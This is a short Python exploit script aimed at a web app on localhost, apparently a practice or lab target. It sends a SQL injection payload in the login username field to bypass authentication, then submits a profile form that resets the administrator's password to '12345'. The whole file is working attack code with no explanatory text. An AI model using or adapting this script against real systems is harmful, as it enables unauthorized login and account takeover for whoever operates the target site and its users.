import requests

session = requests.session()

url = "http://127.0.0.1:8001/user/login"
headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:8001", "Connection": "close", "Referer": "http://127.0.0.1:8001/user/login?from=%2F", "Upgrade-Insecure-Requests": "1"}
data = {"username": "test' OR '1'='1' -- ", "password": "test", "Login": "Login"}
session.post(url, headers=headers, data=data)

url = "http://127.0.0.1:8001/user/profile"
headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------204577204034397935912976178641", "Origin": "http://127.0.0.1:8001", "DNT": "1", "Connection": "close", "Referer": "http://127.0.0.1:8001/user/profile", "Upgrade-Insecure-Requests": "1"}
data = "-----------------------------204577204034397935912976178641\r\nContent-Disposition: form-data; name=\"displayname\"\r\n\r\nAdministrator\r\n-----------------------------204577204034397935912976178641\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n12345\r\n-----------------------------204577204034397935912976178641\r\nContent-Disposition: form-data; name=\"bio\"\r\n\r\n<p>I am Administrator!</p>\r\n\r\n-----------------------------204577204034397935912976178641\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------204577204034397935912976178641\r\nContent-Disposition: form-data; name=\"Update\"\r\n\r\nUpdate\r\n-----------------------------204577204034397935912976178641--\r\n"
session.post(url, headers=headers, data=data)

print("Changed admin user password to '12345'")

